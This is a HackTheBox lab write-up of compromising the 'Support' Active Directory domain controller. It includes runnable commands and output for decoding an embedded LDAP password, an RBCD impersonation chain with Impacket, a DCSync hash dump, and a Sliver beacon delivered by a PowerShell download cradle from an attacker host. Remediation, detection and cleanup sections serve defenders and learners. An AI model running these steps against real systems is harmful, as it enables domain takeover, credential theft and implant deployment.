---
layout: default
title: "HackTheBox - Support"
---

# HackTheBox - Support

**OS:** Windows Server 2022 (Active Directory)

Support is a Windows Active Directory machine for the `support.htb` domain. A Guest/null
SMB session reads a `support-tools` share holding a custom `.NET` helper, `UserInfo.exe`,
whose embedded LDAP service credential is trivially recoverable by reversing a base64 +
XOR obfuscation routine. That `ldap` account binds to LDAP and exposes a second password
hidden in the `info` attribute of the `support` user, which is a member of Remote
Management Users and yields a WinRM shell. `support` also belongs to Shared Support
Accounts, a group with write access over the domain controller's computer object;
combined with the default Machine Account Quota, that write is abused for a
Resource-Based Constrained Delegation attack to impersonate Administrator and take the
domain. A Sliver implant is deployed on the DC to model post-exploitation C2.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (DC.support.htb) |
| Initial Access | Anonymous SMB share -> .NET credential recovery -> LDAP `info` leak -> WinRM |
| Privilege Escalation | RBCD via Shared Support Accounts write on DC$ -> S4U2Proxy impersonation |
| Final Access | `support\administrator` |

---

## Recon

### Port Scan

A full TCP sweep (run through the in-house `p0rtix` recon wrapper) returned the classic
domain-controller fingerprint: DNS, Kerberos, LDAP/LDAPS, SMB, the global catalog,
WinRM, ADWS, and the high RPC range. No web service was present, everything routes
through AD infrastructure.

| Port | Proto | Service | Notes |
|---|---|---|---|
| 53 | TCP/UDP | DNS | `support.htb` |
| 88 | TCP/UDP | Kerberos | AS-REP / delegation surface |
| 123 | UDP | NTP | |
| 135 / 593 | TCP | MSRPC / RPC-over-HTTP | |
| 139 / 445 | TCP | SMB | signing **required** (no relay) |
| 389 / 636 / 3268 / 3269 | TCP | LDAP / LDAPS / GC | |
| 464 | TCP | kpasswd | |
| 5985 | TCP | WinRM | used for the initial shell |
| 9389 | TCP | ADWS | |
| 49664+ | TCP | MSRPC (ephemeral) | |

The host `DC` and domain `support.htb` were confirmed over SMB (Windows Server 2022
Build 20348). Two policy facts mattered for the rest of the box: SMB signing is
**required** (NTLM relay is off the table) and the account **lockout threshold is 0**
(spraying and roasting are safe to run at speed).

### Unauthenticated AD Enumeration

The domain permits a Guest/null SMB session, and Guest holds **READ** on a non-default
share named `support-tools`:

```
nxc smb <target-ip> -u Guest -p ''
SMB   <target-ip>   445   DC   [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   <target-ip>   445   DC   [+] support.htb\Guest:

smbclient //<target-ip>/support-tools -U 'Guest%' -c 'ls'
  7-ZipPortable_21.07.paf.exe         A  2880728
  npp.8.4.1.portable.x64.zip          A  5439245
  putty.exe                           A  1273576
  SysinternalsSuite.zip               A 48102161
  UserInfo.exe.zip                    A   277499
  windirstat1_1_2_setup.exe           A    79171
  WiresharkPortable64_3.6.5.paf.exe   A 44398000
```

Every file except `UserInfo.exe.zip` is a stock, publicly downloadable admin tool. The
custom, box-specific artifact is `UserInfo.exe.zip`, so that is the one worth pulling.

The credentialed LDAP dump run later also confirmed **MachineAccountQuota = 10**, meaning
any authenticated domain user can create machine accounts, a prerequisite for the RBCD
escalation used to root the box.

---

## Initial Access

### Recovering the LDAP Credential from `UserInfo.exe`

`UserInfo.exe.zip` was retrieved and unpacked:

```
smbclient //<target-ip>/support-tools -U 'Guest%' -c 'get UserInfo.exe.zip'
unzip UserInfo.exe.zip
```

`UserInfo.exe` is a .NET assembly. A wide-character (UTF-16) string dump surfaces the
LDAP bind identity, the LDAP URL, an obfuscation key, and a base64 blob that is clearly
the stored password:

```
strings -e l UserInfo.exe | grep -iE 'ldap|armando|=$'
support\ldap
LDAP://support.htb
armando
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```

Decompiling the `Protected.getPassword()` method shows the encoding scheme: the base64
blob is decoded to bytes, and each byte is XORed with the repeating key `armando` and a
constant `0xDF`. Reimplementing that routine recovers the plaintext:

```python
import base64
enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = base64.b64decode(enc)
out = bytes(data[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(data)))
print(out.decode())        # ldap password: nv**********
```

> **Why this works:** obfuscation is not encryption. The key and the algorithm both
> ship inside the binary that has to decode the secret at runtime, so anyone who can read
> the binary can reproduce the exact decode. Storing a service credential in a
> world-readable share protected only by an in-binary XOR routine is functionally the
> same as storing it in plaintext.

The credential `support\ldap : nv**********` was validated against SMB, confirming a real
domain account.

### LDAP `info` Attribute Leak

The `ldap` account is low privilege but can bind and read the directory. Querying the
`support` user object exposes a password stored in its `info` attribute, along with the
group memberships that make that account valuable:

```
ldapsearch -x -H ldap://<target-ip> -D 'support\ldap' -w '<ldap-pass>' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)' info memberOf

info: Ir**********
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

> **Why this works:** the `info` (Notes) attribute is a free-text field readable by any
> authenticated principal. Administrators frequently stash "temporary" passwords there,
> forgetting that it is not access-controlled like a password hash. It is one of the
> first attributes to check on every user object during credentialed AD enumeration.

### Shell via WinRM

`support` is a member of **Remote Management Users**, so the recovered password gives an
interactive WinRM shell directly. A credential-reuse sweep confirmed it first (`Pwn3d!`),
then evil-winrm was used for the shell:

```
nxc winrm <target-ip> -u support -p '<support-pass>'
WINRM   <target-ip>   5985   DC   [+] support.htb\support:<support-pass> (Pwn3d!)

evil-winrm -i <target-ip> -u support -p '<support-pass>'
*Evil-WinRM* PS C:\Users\support\Desktop> whoami; type user.txt
support\support
<user-flag-redacted>
```

---

## Post-Access Enumeration

Credentialed LDAP enumeration (via `ldapdomaindump` as `ldap`) recovered the full user
list and the two facts that determine the escalation path:

- `support` is a member of **Shared Support Accounts**. That group holds
  **GenericWrite / GenericAll** over the domain controller's computer object (`DC$`),
  which permits writing `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD.
- **MachineAccountQuota = 10** lets any authenticated user create a machine account to
  act as the delegated principal.

```
ldapdomaindump -u 'support.htb\ldap' -p '<ldap-pass>' -o loot/ldapdomaindump ldap://<target-ip>
- 20 domain users extracted
- MachineAccountQuota = 10
- Lockout threshold = 0 (no lockout)
```

> **Why this works:** RBCD (Resource-Based Constrained Delegation) is configured by
> writing a single attribute on the *target* computer object. Unlike classic constrained
> delegation, no Domain Admin action is needed, if you can write
> `msDS-AllowedToActOnBehalfOfOtherIdentity` on `DC$` and you control any principal with
> an SPN (a machine account you just created), you can have that principal request tickets
> for any user to any service on the DC.

---

## Privilege Escalation

### RBCD to Impersonate Administrator

The attack has four steps, all runnable from the attack box with Impacket using
`support`'s credential:

**1. Create a machine account** (allowed by MachineAccountQuota = 10):

```
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake01Pass!' \
  -dc-ip <target-ip> 'support.htb/support:<support-pass>'
[*] Successfully added machine account FAKE01$ with password Fake01Pass!.
```

**2. Write the RBCD attribute on `DC$`** using `support`'s write access over the DC
object:

```
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write \
  -dc-ip <target-ip> 'support.htb/support:<support-pass>'
[*] Delegation rights modified successfully!
[*] FAKE01$ can now impersonate users on DC$ via S4U2Proxy
```

**3. S4U2Self + S4U2Proxy** to obtain a service ticket for `cifs/dc.support.htb` while
impersonating Administrator:

```
impacket-getST -spn 'cifs/dc.support.htb' -impersonate Administrator \
  -dc-ip <target-ip> 'support.htb/FAKE01$:Fake01Pass!'
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

**4. Use the ticket** to execute as Administrator on the DC and read the root flag:

```
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-wmiexec -k -no-pass -dc-ip <target-ip> -target-ip <target-ip> \
  'support.htb/Administrator@dc.support.htb' \
  'type C:\Users\Administrator\Desktop\root.txt'
[*] SMBv3.0 dialect used
<root-flag-redacted>
```

> **Gotcha worth recording:** the attack host had no ability to edit `/etc/hosts` and no
> DNS entry for `dc.support.htb`. Kerberos requires the SPN hostname, but the TCP
> connection just needs the IP. Impacket's `-target-ip` flag decouples the two: the
> ticket presents the SPN `cifs/dc.support.htb` while the socket connects straight to
> `<target-ip>`, so no name resolution is needed at all.

The same ticket was used with `secretsdump` to replicate the Administrator hash as proof
of full domain compromise:

```
impacket-secretsdump -k -no-pass -dc-ip <target-ip> -target-ip <target-ip> \
  -just-dc-user Administrator 'support.htb/Administrator@dc.support.htb'
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted-nt-hash>:::
```

Full domain compromise achieved.

---

## Post-Access: C2 (Sliver)

To model realistic operator tradecraft beyond one-shot Impacket calls, a Sliver beacon
was deployed on the DC in the Administrator context. The team server was started, an
HTTPS listener stood up, and a Windows beacon generated pointed at the operator's
listener. The beacon was delivered with a PowerShell download cradle executed through the
Administrator ticket (`iwr http://<attacker-ip>:8088/u.exe` then `Start-Process`), and it
checked in as `SUPPORT\Administrator`.

```
sliver > https --lhost 0.0.0.0 --lport 443

[*] Starting HTTPS :443 listener ...
[*] Successfully started job #10

sliver > generate beacon --https <attacker-ip>:443 --os windows --arch amd64 --format EXECUTABLE --save /tmp/

[*] Generating new windows/amd64 beacon implant binary (60s)
[*] Symbol obfuscation is enabled
[*] Build completed in 30s
[*] Implant saved to /tmp/REMAINING_TURNSTILE.exe
```

After the download cradle executed the implant on the DC, it registered as a beacon:

```
sliver > beacons

 ID         Name                 Hostname   Username               OS/Arch         Transport
========== ==================== ========== ====================== =============== ===========
 200e5a08   REMAINING_TURNSTILE  dc         SUPPORT\Administrator  windows/amd64   http(s)

sliver > use 200e5a08

[*] Active beacon REMAINING_TURNSTILE (200e5a08-9fac-4566-8910-9375a286b128)

sliver (REMAINING_TURNSTILE) > execute -o cmd.exe /c 'whoami & hostname & type C:\Users\Administrator\Desktop\root.txt'

[*] Output:
support\administrator
dc
<root-flag-redacted>
```

The beacon confirms a stable, encrypted C2 channel in the Administrator context, the
position from which an adversary would establish persistence, dump the `krbtgt` key for
golden tickets, and pivot to any trusting systems. The implant and listener were torn
down after the demonstration (see Cleanup).

---

## Root Cause

Support falls to a chain of credential-hygiene and delegation failures, each of which
independently violates least privilege:

1. **World-readable service credential**, the `ldap` account password shipped inside a
   binary on a Guest-readable share, protected only by in-binary XOR obfuscation.
2. **Password stored in the `info` attribute**, the `support` account's password sat in
   a free-text directory field readable by any authenticated user.
3. **Excessive ACL over the DC computer object**, a general "Shared Support Accounts"
   group held write access over `DC$`, enabling RBCD.
4. **Default Machine Account Quota (10)**, any user could create the machine account
   needed to complete the delegation attack.

Remove any one of links 1-3 and the path to Domain Admin breaks.

## Impact

Complete compromise of the `support.htb` domain. The RBCD attack yields Administrator-level
code execution on the domain controller and, via DCSync, every account hash including
`Administrator` and `krbtgt`. Possession of the `krbtgt` key allows forging golden tickets
for arbitrary identities, so the domain cannot be trusted again until `krbtgt` is rotated
twice and all credentials are reset. Total loss of confidentiality and integrity over all
domain-joined systems.

## Remediation

Recommendations are ordered by priority. The first three break the demonstrated attack
path outright; the remainder reduce blast radius.

**1. Remove the write ACL over `DC$` (highest priority).** No general support group should
hold `GenericWrite`/`GenericAll` over a domain controller computer object. Audit the DACL
on all tier-0 objects and strip write ACEs from every principal that is not itself a
domain controller or a sanctioned, monitored tier-0 identity. Adopt a tiered
administration model.

**2. Remove secrets from the directory and from shared binaries.** Delete the password in
the `support` user's `info` attribute and audit every user object for credentials stored
in `info`/`description`/`comment`. Remove `UserInfo.exe` from the share (or rebuild it to
fetch credentials from a vault at runtime), and rotate the `ldap` and `support` passwords,
both are now exposed.

**3. Lock down the anonymous share.** Remove Guest READ from `support-tools`; distribute
admin tooling through an authenticated, access-controlled channel.

**4. Lower the Machine Account Quota.** Set `ms-DS-MachineAccountQuota` to 0 and delegate
machine-join rights explicitly to a controlled provisioning identity. This alone removes
the ability of an arbitrary user to complete an RBCD attack.

**5. Restrict administrative protocols.** Limit WinRM (5985) and Remote Management Users
membership to a controlled jump-host tier, and enforce LDAP channel binding / signing
(SMB signing is already required here).

### Validation

- Confirm no principal other than domain controllers holds write access over `DC$`
  (`Get-ACL` on the computer object; BloodHound "shortest path to DC" returns nothing
  from a standard user).
- Attempt `impacket-rbcd -action write` as a standard user and confirm it is denied.
- Query all user objects and confirm no cleartext secrets remain in `info`/`description`.
- Confirm `ms-DS-MachineAccountQuota = 0` and that a standard user cannot `addcomputer`.
- Re-pull `UserInfo.exe` as Guest and confirm the share is no longer anonymously readable.

## Detection Opportunities

- **Anonymous share access:** SMB access (event **5140**/**5145**) to `support-tools` from
  a Guest/null session, especially reads of `UserInfo.exe.zip`.
- **Machine account creation:** event **4741** (a computer account was created) from a
  non-provisioning user, `FAKE01$` here, is a strong RBCD/noPac precursor signal.
- **RBCD attribute write:** directory modification (event **5136**) of
  `msDS-AllowedToActOnBehalfOfOtherIdentity` on a domain controller object.
- **S4U abuse:** Kerberos **4769** service-ticket requests for `cifs/dc` where the
  requesting principal is a freshly created machine account, and S4U2Self/S4U2Proxy
  patterns.
- **DCSync:** event **4662** referencing the replication GUIDs where the requester is not
  a domain controller.
- **C2 beaconing:** regular-interval HTTPS callbacks to a non-corporate host; egress
  filtering and TLS inspection on server VLANs would surface the Sliver channel.

## Lessons Learned

- **Custom binaries on shares are credential stores.** The one non-stock file on the
  share held the whole foothold; obfuscation with an in-binary key is not protection.
- **Always read `info` and `description` on every user object** during credentialed AD
  enumeration, they are where "temporary" passwords go to live forever.
- **RBCD needs only a single writable attribute.** A write ACL over the DC object plus the
  default MachineAccountQuota is a complete, Domain-Admin-free path to the DC.
- **`-target-ip` decouples the Kerberos SPN from the TCP target**, when DNS or `/etc/hosts`
  is unavailable, this is the difference between a working ticket and a dead connection.

---

## Cleanup

- Payload `C:\Windows\Temp\u.exe` was killed (`taskkill /F /IM u.exe`) and deleted from
  the DC; verified removed (`File Not Found`).
- The Sliver beacon and HTTPS listener were torn down (`kill_beacon`, `kill_job`).
- The RBCD attribute written on `DC$` was reverted:
  `impacket-rbcd -delegate-to 'DC$' -action flush` (attribute confirmed empty).
- The machine account `FAKE01$` created for the attack was deleted:
  `impacket-addcomputer -delete -method SAMR` (confirmed "Successfully deleted").
- The local HTTP delivery server was stopped and the staged payload removed from the
  attack box. Rotate all credentials exposed during the engagement (`ldap`, `support`,
  and any recovered via DCSync, including `krbtgt`) as part of remediation.
